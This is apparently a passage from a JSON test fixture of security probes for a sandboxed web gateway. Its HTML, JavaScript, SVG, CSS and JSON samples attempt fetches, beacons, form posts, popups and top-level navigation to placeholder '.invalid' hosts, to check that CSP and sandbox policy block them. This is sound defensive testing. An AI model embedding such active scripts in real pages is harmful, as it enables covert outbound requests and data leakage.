{
  "format": "owa-security-probes-v1",
  "profile": "sandboxed-web-v1",
  "notes": [
    "Separate gateway security probes, not additions to or replacements for the immutable portable conformance corpus.",
    "samples are literal UTF-8 strings (or explicitly base64 bytes). typeCases reference samples; inline preserves the original mediaType string, attachment means application/octet-stream.",
    "pathCases contain the received raw pathname, direct expected resolvedPath, and whether rejection must precede SPA fallback. requestTargetCases are HTTP framing checks, not direct-resolver vectors.",
    "The server suite only sends raw HTTP to an ephemeral loopback listener and compares bytes and headers. It never evaluates these scripts, renders documents, follows links, or fetches .invalid destinations.",
    "Optional manual browser probes: serve html, javascript, css, and svg as the indicated artifact resources on a fresh isolated origin. Observe CSP/sandbox violations and absence of outbound attempts; verify inline CSS and the data image still render. Header assertions alone do not establish browser enforcement.",
    "Scripts below attempt real operations if policy is removed. Do not open them unprotected. Ordinary self-targeted navigation is not promised to be blocked. This profile is not authentication or sanitization."
  ],
  "samples": {
    "html": {
      "mediaType": "text/html; charset=utf-8",
      "text": "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>Untrusted security probe</title><base href=\"https://base.invalid/\"><link rel=\"dns-prefetch\" href=\"//dns.invalid\"><link rel=\"stylesheet\" href=\"https://styles.invalid/probe.css\"><style>@import url('https://import.invalid/style.css');body{color:rgb(20,80,40)}.probe{background-image:url('https://css-image.invalid/pixel')}</style></head><body onload=\"fetch('https://handler.invalid/load')\"><h1>Untrusted probe — café</h1><img alt=\"allowed data image\" src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==\"><img alt=\"blocked network image\" src=\"https://image.invalid/pixel\"><script src=\"https://script.invalid/probe.js\"></script><script>try{window.open('https://popup.invalid/','_blank')}catch(e){};try{fetch('https://fetch.invalid/probe',{mode:'no-cors'}).catch(()=>{})}catch(e){};try{navigator.sendBeacon('https://beacon.invalid/probe','probe')}catch(e){};try{document.getElementById('probe-form').submit()}catch(e){};try{top.location.href='https://top.invalid/'}catch(e){}</script><form id=\"probe-form\" method=\"post\" action=\"https://form.invalid/\" target=\"_top\"><input name=\"probe\" value=\"not-a-secret\"><button>Submission probe</button></form><script>try{document.getElementById('probe-form').submit()}catch(e){}</script><object data=\"https://object.invalid/probe.svg\" type=\"image/svg+xml\"></object><iframe src=\"https://frame.invalid/\"></iframe><a href=\"https://self-navigation.invalid/\">Self-navigation is outside the no-subresource guarantee</a></body></html>\n"
    },
    "javascript": {
      "mediaType": "text/javascript; charset=utf-8",
      "text": "/* Only bytes in the HTTP suite; actual attempts for a separately run browser probe. */\ntry { window.open('https://popup.invalid/', '_blank'); } catch (e) {}\ntry { fetch('https://fetch.invalid/', {mode:'no-cors'}).catch(() => {}); } catch (e) {}\ntry { navigator.sendBeacon('https://beacon.invalid/', 'probe'); } catch (e) {}\ntry { const f=document.createElement('form'); f.action='https://form.invalid/'; f.method='post'; document.body.append(f); f.submit(); } catch (e) {}\ntry { top.location.href='https://top.invalid/'; } catch (e) {}\ntry { new Worker('https://worker.invalid/probe.js'); } catch (e) {}\n"
    },
    "css": {
      "mediaType": "text/css; charset=utf-8",
      "text": "@import url('https://import.invalid/style.css');\n@font-face{font-family:probe;src:url('https://font.invalid/probe.woff2')}\nbody{color:rgb(20,80,40);background-image:url('https://css-image.invalid/pixel');font-family:probe}\n"
    },
    "svg": {
      "mediaType": "image/svg+xml",
      "text": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"160\" height=\"60\" onload=\"fetch('https://svg-handler.invalid/')\"><script>try{window.open('https://svg-popup.invalid/')}catch(e){};try{fetch('https://svg-fetch.invalid/').catch(()=>{})}catch(e){}</script><image xlink:href=\"https://svg-image.invalid/pixel\" width=\"1\" height=\"1\"/><foreignObject width=\"160\" height=\"60\"><div xmlns=\"http://www.w3.org/1999/xhtml\"><iframe src=\"https://svg-frame.invalid/\"></iframe>active SVG probe</div></foreignObject><text x=\"1\" y=\"20\">SVG bytes unchanged</text></svg>\n"
    },
    "plain": { "mediaType": "text/plain; charset=utf-8", "text": "literal text: café; percent %2e%2e; + stays +\n" },
    "json": { "mediaType": "application/json; charset=utf-8", "text": "{\"probe\":\"<script>fetch('https://json.invalid/')</script>\"}\n" },
    "wasm": { "mediaType": "application/wasm", "base64": "AGFzbQEAAAA=" },
    "gif": { "mediaType": "image/gif", "base64": "R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" },
    "binary": { "mediaType": "application/octet-stream", "base64": "AP8QDQo8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+AA==" }
  },
